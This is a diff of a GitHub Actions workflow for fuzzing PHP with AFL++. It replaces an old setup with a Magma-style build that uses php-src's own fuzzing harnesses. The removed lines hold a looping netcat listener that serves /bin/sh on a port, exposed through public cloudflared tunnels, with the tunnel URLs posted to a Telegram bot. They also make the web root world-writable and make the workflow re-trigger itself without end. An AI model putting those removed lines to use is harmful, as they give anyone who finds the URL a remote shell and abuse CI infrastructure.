@@ -1,246 +1,174 @@
-name: Php Fuzzing CI  #nama ini jangan dirubah, ntah kenapa error saat loop
+name: Fuzz PHP (AFL++, gaya Magma)
 
-# STOP: gh workflow disable "syzkaller fuzzing CI"
-# gh run cancel 38494535088 --force
-# START:
-# gh workflow list --all        # lihat status: active / disabled_manually
-# gh workflow enable "syzkaller fuzzing CI"
-
+# Meniru targets/php dan fuzzers/afl dari Magma v1.2.1:
+#  - harness bawaan php-src (sapi/fuzzer): unserialize, json, exif, parser
+#  - build dengan --enable-fuzzer, engine = driver AFL (persistent loop)
+#  - setup.patch milik Magma (menangani ifunc yang crash di build AFL)
+#  - seed corpus dari generate_*.php milik php-src
+# Bedanya dengan Magma: tanpa canary/bug injection, dan ASAN aktif untuk mencari bug nyata.
 
 on:
-  workflow_dispatch:
   push:
-    branches: [v4.32c-fuzzing-inci-php]
-    paths:
-      - ".github/workflows/fuzzing.yml"
+    branches: [v4.32c-fuzzing-inci-php-magma]
+  pull_request:
+    branches: [v4.32c-fuzzing-inci-php-magma]
+
+  workflow_dispatch:
+    inputs:
+      minutes:
+        description: "Durasi fuzzing per driver (menit, maks ~300)"
+        default: "60"
   schedule:
-    - cron: "0 */6 * * *"   # opsional, jaring pengaman kalau rantai putus
+    - cron: "0 20 * * 0"
 
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: false # jangan batalkan jika masih run, misal saat commit>
-
-permissions:
-  contents: read
-  actions: write
-
+env:
+  MAGMA_TAG: v1.2.1
+  # commit yang sama dengan magma/targets/php/fetch.sh
+  PHP_COMMIT: bc39abe8c3c492e29bc5d60ca58442040bbf063b
+  FUZZ_MINUTES: ${{ github.event.inputs.minutes || '60' }}
 
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 350 # paksa berhenti sebelum 6 jam
-    env:
-      CHAT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-      CHAT_ID: "7797309176"
-      RUN_ID: "AFL-php7 ${{ github.run_id }}"
-      DURATION: ${{ inputs.seconds || '60' }}
-
-
+    container: aflplusplus/aflplusplus:latest
+    timeout-minutes: 90
     steps:
-      - uses: actions/checkout@v4
-
-      - name: Install dependencies
+      - name: Dependencies
         run: |
-          sudo apt-get update
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
-            git ssh openssh-client curl jq \
-            busybox-static netcat-openbsd afl++ \
-            apache2 php libapache2-mod-php
+          apt-get update
+          apt-get install -y --no-install-recommends git ca-certificates make autoconf automake \
+            libtool bison re2c pkg-config libonig-dev patch
 
-
-      - name: Buka tunnel listener nc
+      - name: Fetch php-src (commit Magma) dan setup.patch Magma
         run: |
-          #ubah www-data ke root
-          sudo sed -i \
-            -e 's/^export APACHE_RUN_USER=.*/export APACHE_RUN_USER=runner/' \
-            -e 's/^export APACHE_RUN_GROUP=.*/export APACHE_RUN_GROUP=runner/' \
-            /etc/apache2/envvars
+          git clone --no-checkout https://github.com/php/php-src.git php-src
+          git -C php-src checkout "$PHP_COMMIT"
+          git clone --depth 1 --branch "$MAGMA_TAG" https://github.com/HexHive/magma.git magma
+          patch -p1 -d php-src < magma/targets/php/patches/setup/setup.patch
 
-          sudo chmod 777 -R /var/www/html/
-          cd /var/www/html/
-          git clone https://github.com/sunjangyo12/ai-web
-          echo 1 > ai-web/settings.txt #php8 fix
+      - name: Cari driver AFL++
+        id: drv
+        run: |
+          D=$(find / -name libAFLDriver.a 2>/dev/null | head -1)
+          [ -n "$D" ] || { echo "::error::libAFLDriver.a tidak ditemukan"; exit 1; }
+          echo "path=$D" >> "$GITHUB_OUTPUT"
 
-          sudo service apache2 start
-
-          curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
-          chmod +x cloudflared
-
-          # http listener
-          nohup ./cloudflared tunnel --no-autoupdate --url http://127.0.0.1:80 > wtunnel.log 2>&1 &
-          URL=""
-          for i in $(seq 1 30); do
-            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' wtunnel.log | head -1)
-            [ -n "$URL" ] && break
-            sleep 2
-          done
-          if [ -n "$URL" ]; then
-            MSG="[$RUN_ID] WEB: $URL"
-          fi
-          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
-            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
-
-          # nc listener
-          nohup ./cloudflared tunnel --no-autoupdate --url tcp://127.0.0.1:20022 > tunnel-nc.log 2>&1 &
-          URL=""
-          for i in $(seq 1 30); do
-            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel-nc.log | head -1)
-            [ -n "$URL" ] && break
-            sleep 2
-          done
-
-          if [ -n "$URL" ]; then
-            MSG="[$RUN_ID] Listener NC: $URL"
-          else
-            MSG="[$RUN_ID] nc publik url"
-          fi
-
-          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
-            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
-
-
-      - name: Ambil state sesi sebelumnya
-        continue-on-error: true
+      - name: Configure + build (afl-clang-fast + ASAN)
+        working-directory: php-src
         env:
-          GH_TOKEN: ${{ github.token }}
+          AFL_USE_ASAN: "1"
+          AFL_LLVM_INSTRUMENT: "CLASSIC"
         run: |
-          mkdir -p ~/prev
-          FOUND=0
+          export CC=afl-clang-fast CXX=afl-clang-fast++
+          # sama seperti Magma: object-size sanitizer tidak cocok dengan union zend_function
+          export EXTRA_CFLAGS="-O1 -g -fno-sanitize=object-size"
+          export EXTRA_CXXFLAGS="$EXTRA_CFLAGS"
+          ./buildconf --force
+          LIB_FUZZING_ENGINE="${{ steps.drv.outputs.path }}" ./configure \
+            --disable-all --enable-option-checking=fatal \
+            --enable-fuzzer --enable-exif --enable-phar --enable-mbstring \
+            --without-pcre-jit --disable-phpdbg --disable-cgi --with-pic
+          make -j"$(nproc)"
+          ls -l sapi/fuzzer/php-fuzz-* sapi/cli/php
 
-          # 1. Coba ambil dari artifact run terakhir (repo saat ini)
-          NAME="fuzz-state-${{ github.ref_name }}"
-          ID=$(gh api "repos/${{ github.repository }}/actions/artifacts?name=$NAME&per_page=5" \
-                 -q '[.artifacts[] | select(.expired==false)][0].id')
-
-          if [ -n "$ID" ] && [ "$ID" != "null" ]; then
-            echo "State ditemukan di artifact (id=$ID)"
-            gh api "repos/${{ github.repository }}/actions/artifacts/$ID/zip" > prev.zip
-            unzip -q prev.zip -d /tmp
-            tar xzf /tmp/fuzz-out.tar.gz -C ~/prev
-
-            FOUND=1
-            MSG="[$RUN_ID] Pakai corpus dari artifact: $NAME"
-          fi
-
-          # 2. Fallback: ambil dari release di repo lain lewat wget
-          # gh release create "fuzz-state" fuzz-state.zip --title "x" --notes "x" --prerelease
-          # gh release delete "fuzz-state" --yes
-          if [ "$FOUND" -eq 0 ]; then
-            OTHER_REPO="sunjangyo12/test-ci"
-            TAG="fuzz-state"
-            ASSET="fuzz-state.zip"
-
-            URL="https://github.com/${OTHER_REPO}/releases/download/${TAG}/${ASSET}"
-
-            if wget -q "$URL" -O prev.zip; then
-              unzip -q prev.zip -d ~/prev
-              FOUND=1
-              MSG="[$RUN_ID] State ditemukan di release repo lain"
-
-            else
-              MSG="[$RUN_ID] Gagal unduh dari release repo lain (mungkin belum ada)"
-            fi
-          fi
-
-          if [ "$FOUND" -eq 1 ]; then
-            ls -R ~/prev | head -20
-          else
-            MSG="[$RUN_ID] Tidak ada state lama, mulai dari nol"
-          fi
-
-          # telegram
-          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
-            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null
-
-
-
-      - name: Get PHP
+      - name: Generate seed corpora (sama dengan build.sh Magma)
+        working-directory: php-src
         run: |
-          wget https://github.com/SunJangYo12/test-ci/releases/download/php-7.2.11/result.tar.gz
-          tar xzf result.tar.gz
-
-          sudo mkdir -p /work
-          sudo chmod 777 -R /work
-          mv php7 /work
-
-
-      - name: Prepare seeds
-        run: |
-          cd /work/php7
-          mkdir -p fuzz-out || true
-          mkdir -p fuzz-seeds && cd fuzz-seeds
-          ../sapi/cli/php -r 'echo serialize("a");' > string
-          ../sapi/cli/php -r 'echo serialize(1);' > number
-          ../sapi/cli/php -r 'echo serialize([1,2]);' > array_of_num
-          ../sapi/cli/php -r 'echo serialize(["1","2"]);' > array_of_str
-          ../sapi/cli/php -r 'echo serialize([["1","2"],["3","4"],[1,2]]);' > array_of_array
-          ls -l
-
-
-      - name: Run Fuzzer AFL++
-        run: |
-          # listener nc
-          while [ 1 ]; do busybox nc -l -p 20022 -e /bin/sh -i; echo "start nc listen"; done &
-          PID_NC=$!
-
-          # lanjutkan corpus dari sesi sebelumnya
-          if [ -d ~/prev/fuzz-out ]; then
-            cp -a ~/prev/fuzz-out/. /work/php7/fuzz-out
-            export AFL_AUTORESUME=1
-          fi
-
-          timeout -s INT -k 2m 5h \
-            bash utils/php_fuzzing/run.sh || true
-
-          # bersihkan semua proses latar belakang
-          kill $PID_NC 2>/dev/null || true
-
-
-      - name: Send crash details
-        run: |
-          HANGS=$(find /work/php7/fuzz-out/*/hangs -maxdepth 1 -type f ! -name 'README.txt' 2>/dev/null | wc -l)
-          TOTAL=0
-          DETAIL=""
-
-          for dir in /work/php7/fuzz-out/*/crashes; do
-            [ -d "$dir" ] || continue
-            INSTANCE=$(basename "$(dirname "$dir")")
-            COUNT=$(find "$dir" -maxdepth 1 -type f ! -name 'README.txt' | wc -l)
-            TOTAL=$((TOTAL + COUNT))
-            if [ "$COUNT" -gt 0 ]; then
-              DETAIL="$DETAIL\n  - $INSTANCE: $COUNT"
-            fi
+          # php CLI hasil build ber-ASAN; leak tidak relevan untuk generator
+          export ASAN_OPTIONS=detect_leaks=0 USE_ZEND_ALLOC=0
+          sapi/cli/php sapi/fuzzer/generate_unserialize_dict.php
+          sapi/cli/php sapi/fuzzer/generate_parser_corpus.php
+          for d in unserialize json exif parser; do
+            mkdir -p "sapi/fuzzer/corpus/$d"
+            [ -n "$(ls -A sapi/fuzzer/corpus/$d)" ] || printf 'a' > "sapi/fuzzer/corpus/$d/seed"
           done
-          if [ "$TOTAL" -gt 0 ]; then
-            MSG="[$RUN_ID] Done with hangs: $HANGS crash: $TOTAL total$DETAIL"
-          else
-            MSG="[$RUN_ID] Done with hangs: $HANGS, no crash found"
-          fi
 
-          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
-            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null || true
-
-
-
-      - name: Collect artifacts
+      - name: Package
         run: |
-          mkdir -p output
+          mkdir -p pkg/corpus
+          for d in unserialize json exif parser; do
+            cp php-src/sapi/fuzzer/php-fuzz-$d pkg/$d
+            cp -r php-src/sapi/fuzzer/corpus/$d pkg/corpus/$d
+          done
+          # dictionary untuk unserialize jika ada
+          cp php-src/sapi/fuzzer/dict/unserialize pkg/unserialize.dict 2>/dev/null || true
+          tar czf pkg.tgz pkg
 
-          tar czvf output/fuzz-out.tar.gz -C /work/php7 fuzz-out
-
-
-      - name: Upload artifact
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
-          name: fuzz-state-${{ github.ref_name }}
-          path: output/fuzz-out.tar.gz
-          retention-days: 7
+          name: php-fuzzers
+          path: pkg.tgz
 
+  fuzz:
+    needs: build
+    runs-on: ubuntu-latest
+    container: aflplusplus/aflplusplus:latest
+    timeout-minutes: 355
+    strategy:
+      fail-fast: false
+      matrix:
+        driver: [unserialize, json, exif, parser]
+    steps:
+      - name: Runtime deps
+        run: apt-get update && apt-get install -y --no-install-recommends libonig5
 
+      - uses: actions/download-artifact@v4
+        with:
+          name: php-fuzzers
 
-      - name: Lanjutkan sesi berikutnya
-        if: ${{ !cancelled() }}
+      - name: Unpack
+        run: tar xzf pkg.tgz
+
+      - name: Restore corpus dari run sebelumnya
+        uses: actions/cache@v4
+        with:
+          path: carry/${{ matrix.driver }}
+          key: php-${{ matrix.driver }}-corpus-${{ github.run_id }}
+          restore-keys: php-${{ matrix.driver }}-corpus-
+
+      - name: afl-fuzz
         env:
-          GH_TOKEN: ${{ github.token }}
+          AFL_NO_UI: "1"
+          AFL_SKIP_CPUFREQ: "1"
+          AFL_NO_AFFINITY: "1"
+          AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES: "1"
+          USE_ZEND_ALLOC: "0"
+          ASAN_OPTIONS: abort_on_error=1:detect_leaks=0:symbolize=0
         run: |
-          gh workflow run "${{ github.workflow }}" --ref ${{ github.ref_name }}
+          D=${{ matrix.driver }}
+          mkdir -p "carry/$D" out
+          if [ -n "$(ls -A carry/$D 2>/dev/null)" ]; then IN="carry/$D"; else IN="pkg/corpus/$D"; fi
+          DICT=""; [ "$D" = unserialize ] && [ -f pkg/unserialize.dict ] && DICT="-x pkg/unserialize.dict"
+          SECS=$(( FUZZ_MINUTES * 60 ))
+          N=$(nproc)
+          afl-fuzz -i "$IN" -o out -M main -V "$SECS" -m none $DICT -- "pkg/$D" > main.log 2>&1 &
+          for i in $(seq 1 $((N-1))); do
+            afl-fuzz -i "$IN" -o out -S "s$i" -V "$SECS" -m none $DICT -- "pkg/$D" > "s$i.log" 2>&1 &
+          done
+          wait || true
+          afl-whatsup -s out || true
+
+      - name: Simpan corpus
+        if: always()
+        run: |
+          mkdir -p "carry/${{ matrix.driver }}"
+          cp out/main/queue/id* "carry/${{ matrix.driver }}/" 2>/dev/null || true
+
+      - name: Ringkas crash
+        if: always()
+        run: |
+          echo "## ${{ matrix.driver }}" >> "$GITHUB_STEP_SUMMARY"
+          echo "crash: $(ls out/*/crashes/id* 2>/dev/null | wc -l)" >> "$GITHUB_STEP_SUMMARY"
+          echo "hang:  $(ls out/*/hangs/id* 2>/dev/null | wc -l)" >> "$GITHUB_STEP_SUMMARY"
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: findings-${{ matrix.driver }}
+          path: |
+            out/*/crashes
+            out/*/hangs
+            out/*/fuzzer_stats
+            out/*/plot_data
+            *.log
+          if-no-files-found: ignore
